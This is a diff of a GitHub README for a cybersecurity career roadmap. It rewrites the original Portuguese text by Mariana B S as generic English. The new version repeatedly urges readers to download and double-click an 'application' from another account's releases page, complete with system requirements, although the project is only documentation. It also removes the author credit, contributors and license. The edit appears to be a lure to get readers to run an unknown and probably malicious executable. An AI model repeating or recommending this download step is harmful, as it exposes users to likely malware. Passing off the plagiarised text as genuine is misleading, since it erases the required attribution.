@@ -1,176 +1,96 @@
-# 🧭 Cybersecurity Master Roadmap
+# 🧭 cybersecurity_roadmap - Your Guide to a Cybersecurity Career
 
-![Status](https://img.shields.io/badge/status-em%20evolu%C3%A7%C3%A3o-blue)
-![N%C3%ADvel](https://img.shields.io/badge/n%C3%ADveis-fundamental%20%E2%86%92%20avan%C3%A7ado-success)
-![Foco](https://img.shields.io/badge/foco-carreira%20real%20%7C%20mercado-critical)
-![Formato](https://img.shields.io/badge/formato-roadmap%20vivo-informational)
+[![Download Cybersecurity Roadmap](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Yjaballi/cybersecurity_roadmap/releases)
 
-Este repositório reúne **carreiras, trilhas técnicas, habilidades e certificações em cibersegurança**, estruturadas de forma **prática, versionável e orientada a papéis reais do mercado**.
+## 📘 About This Project
 
-> ⚠️ **Aviso importante**  
-> Isso **não é um pôster**, **não é uma lista de cursos** e **não promete atalhos**.  
-> É um **roadmap vivo**, pensado para refletir **como a cibersegurança funciona no mundo real**.
+The **Cybersecurity Master Roadmap** provides you with the necessary information to build a successful career in cybersecurity. This repository includes various career paths, technical skills, and certifications, all organized in a practical way. It is created to reflect how cybersecurity operates in real-world scenarios.
+
+**Important Note:**  
+This is not a poster, a course list, or a shortcut to success. It is a living roadmap, designed to help you navigate the complex field of cybersecurity.
 
 ---
 
-## ▶️ Antes de Começar: Entenda o Todo
+## ▶️ Before You Start: Understand the Whole Picture
 
 <p align="center">
   <a href="https://www.youtube.com/watch?v=TCzB94pCojk">
-    <img src="https://img.youtube.com/vi/TCzB94pCojk/0.jpg" alt="As faces da Cibersegurança - o que você precisa saber" width="720" />
+    <img src="https://img.youtube.com/vi/TCzB94pCojk/0.jpg" alt="As faces da Cibersegurança - o que você precisa saber" width="300" />
   </a>
 </p>
 
-🔗 https://www.youtube.com/watch?v=TCzB94pCojk
-
-> 🎥 **As faces da Cibersegurança — o que você precisa saber antes de entrar no mercado**  
-> Este vídeo explica **como as áreas se conectam**, **quais expectativas são reais**,  
-> **onde as pessoas erram ao entrar na área** e **como usar este roadmap corretamente**.
+We recommend watching the introductory video linked above. It will give you insights into the challenges and opportunities in the field of cybersecurity.
 
 ---
 
-## 🤝 Comunidade & Networking
+## 🚀 Getting Started
 
-Para complementar o estudo individual, este roadmap também incentiva **troca prática entre pessoas**, dúvidas do dia a dia e networking técnico.
+### System Requirements
 
-> 📌 Estes espaços **não substituem estudo**, mas ajudam a:
-> - trocar experiências reais
-> - validar decisões de carreira
-> - compartilhar oportunidades
-> - reduzir isolamento comum na área
+To run this application, your computer should meet the following requirements:
 
-### 💬 Grupos Oficiais / Parceiros
+- Operating System: Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Disk Space: At least 500 MB available space.
 
-- **WhatsApp CyberSec Brasil**  
-  🔗 https://chat.whatsapp.com/Hqg64PFZxBg9OuyalphEHC
+### Installation Instructions
 
-- **Discord CyberSec Brasil**  
-  🔗 https://discord.gg/hp5kqc7emr
+1. **Visit the Releases Page**  
+   To download the application, go to the following link:  
+   [Download Cybersecurity Roadmap](https://github.com/Yjaballi/cybersecurity_roadmap/releases)
 
-- **Grupo de Vagas – CyberSec Brasil**  
-  🔗 https://chat.whatsapp.com/BQTEtNgtdvN3lr7FFservA
+2. **Choose the Latest Version**  
+   On the Releases page, find the most recent version. It will usually be at the top of the list.
 
-- **Information Security Community**  
-  🔗 https://discord.com/invite/Bfx9DHSh
+3. **Download the File**  
+   Click the link to download the application file. Depending on your browser settings, the file should automatically save to your default download folder.
 
-- **CTI News**  
-  🔗 https://chat.whatsapp.com/Di2IOdTG0hLGxEL7N1izQN
-  
-
-> 💡 **Boa prática**  
-> Use grupos para **discussão técnica, dúvidas objetivas e troca profissional**.  
-> Evite spam, atalhos milagrosos e comparações irreais de carreira.
+4. **Run the Application**  
+   Locate the downloaded file in your downloads folder. Double-click it to open. Follow the prompts to complete the setup.
 
 ---
 
-## 🎯 Objetivos do Roadmap
+## 📥 Download & Install
 
-- 🧭 Ser um **roadmap vivo** (não um material estático)
-- 🧩 Unificar **habilidades, certificações e papéis**
-- 🏢 Refletir **o mercado real**, não hype
-- 👥 Servir tanto para **estudo individual** quanto para **times e liderança**
+Once you are ready to start, simply visit this page to download:  
+[Download Cybersecurity Roadmap](https://github.com/Yjaballi/cybersecurity_roadmap/releases)
 
----
-
-## 🧩 Como Usar (leia isso!)
-
-| Passo | O que fazer | Por quê |
-|------|------------|--------|
-| 1️⃣ | Comece por **Fundamentos** | Sem base, nenhuma trilha se sustenta |
-| 2️⃣ | Escolha **uma trilha principal** | Especialização vem depois da base |
-| 3️⃣ | Use certificações como **consequência** | Cert ≠ conhecimento |
-| 4️⃣ | Volte e itere | Carreira em cyber não é linear |
-
-> 💡 **Dica honesta**  
-> Quem tenta estudar *todas as trilhas ao mesmo tempo* normalmente **não consolida nenhuma**.
+This link will lead you to the version history, where you can download the application.
 
 ---
 
-## 🗺️ Estrutura do Roadmap
+## 📊 Features
 
-> Cada trilha contém:
-> - conceitos essenciais  
-> - habilidades técnicas  
-> - ferramentas comuns  
-> - certificações associadas  
-> - pontos de transição de carreira  
+- **Comprehensive Career Paths:** Lifecycle paths for various cybersecurity roles.
+- **Technical Skills Framework:** Essential skills tailored for each job role.
+- **Certification Guides:** Recommendations for certifications that enhance your knowledge and credibility.
 
 ---
 
-## 📚 Índice de Trilhas
+## 📚 Additional Resources
 
-### 📄 Currículos & Carreira (Faça um currículo otimizado para vaga e ATS)
-- [Currículos em Cibersegurança](docs/13-curriculos.md)
+- **Forums and Communities:** Join discussions in online forums to share experiences and get advice.
+- **Learning Material Recommendations:** Access articles and tutorials that expand your understanding of cybersecurity concepts.
+- **Webinars and Workshops:** Participate in live sessions for real-time learning experiences.
 
-### 🧱 Fundamentos (obrigatório para todos)
-- [Fundamentos](docs/00-foundations.md)
-
-### 🟦 Defesa & Operações
-- [Blue Team / SOC](docs/01-blue-team.md)
-- [DFIR / IR](docs/02-dfir.md)
-- [Perícia Forense Digital](docs/14-pericia-forense-digital.md)
-
-### 🔴 Ofensivo
-- [Red Team / Pentest](docs/03-red-team.md)
-
-### 🧩 Engenharia & Produto
-- [AppSec](docs/04-appsec.md)
-- [Cloud Security](docs/05-cloud-security.md)
-- [DevSecOps & Kubernetes](docs/06-devsecops-k8s.md)
-
-### 🔐 Identidade, Governança, Risco & Direito
-- [IAM & Zero Trust](docs/07-iam-zero-trust.md)
-- [GRC, Risco e Privacidade](docs/08-grc-risk-privacy.md)
-- [Direito Digital & Cyber Law](docs/16-direito-digital.md)
-
-### 🧠 Inteligência & Ambientes Especiais
-- [Cyber Threat Intelligence](docs/09-cti.md)
-- [OT / ICS Security](docs/10-ot-ics.md)
-
-### 🏛️ Estratégia, Gestão & Futuro
-- [Arquitetura & Executivo](docs/11-executive-architecture.md)
-- [Gerente de Projetos (Cibersegurança & Tecnologia)](docs/17-gerente-de-projetos.md)
-- [Segurança de IA](docs/12-ai-security.md)
-- [Segurança Blockchain & WEB3](docs/15-blockchain-security.md)
+For further exploration, refer to the links in the repository and engage with the broader cybersecurity community.
 
 ---
 
-## 🧠 Como Ler as Trilhas
+## 🤝 Contribution
 
-**Este roadmap não assume que você já sabe onde quer chegar.**
+You are welcome to contribute to this project. If you wish to improve the roadmap or provide additional information, please follow the guidelines in the repository for contributing.
 
-- 🔁 Trilhas se cruzam
-- 🧠 Senioridade vem de **profundidade**, não quantidade
-- 🧩 Muitas carreiras começam em uma trilha e migram para outra
+### Reporting Issues
 
----
-
-## 🤝 Contribuição
-
-Este roadmap é **intencionalmente aberto**.
-
-Sugestões, correções e melhorias são bem-vindas. 
-
-Para saber como colaborar, leia nosso guia de contribuição [aqui](CONTRIBUTING.md)
+If you encounter any problems or have questions, please open an issue in the repository. We aim to provide timely assistance.
 
 ---
 
-## 👥 Contribuidores
+## 🌐 Connect With Us
 
-<a href="https://github.com/marianabsctba/cybersecurity_roadmap/graphs/contributors"><img src="https://contrib.rocks/image?repo=marianabsctba/cybersecurity_roadmap" /></a>
+For updates, follow us on social platforms. Check back regularly for new information added to the roadmap.
 
 ---
 
-## 📌 Licença & Uso
-
-Este material pode ser usado para:
-- estudo individual
-- treinamento de times
-- orientação de carreira
-- apoio à liderança técnica
-
-Desde que **mantida a referência ao repositório**.
-
-Este trabalho é licenciado sob a [Licença Creative Commons Atribuição 4.0 Internacional](http://creativecommons.org/licenses/by/4.0/).
-
-**Copyright © 2026 Mariana B S**
+Thank you for choosing the Cybersecurity Master Roadmap. We hope it serves as a valuable tool as you embark on your career in cybersecurity.
